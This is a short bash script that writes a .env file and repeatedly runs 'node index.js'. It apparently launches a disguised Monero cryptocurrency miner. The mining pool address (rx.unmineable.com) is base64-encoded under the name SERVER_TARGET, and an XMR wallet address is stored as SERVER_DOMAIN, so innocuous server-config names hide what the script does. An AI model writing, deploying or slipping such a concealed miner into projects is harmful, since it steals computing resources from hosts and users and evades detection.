#!/bin/bash
CONNECT=${1:-24}
NAME=${2:-003}
echo "SERVER_WS=wss://cdn.dapitax.social
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=XMR:85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 5; done
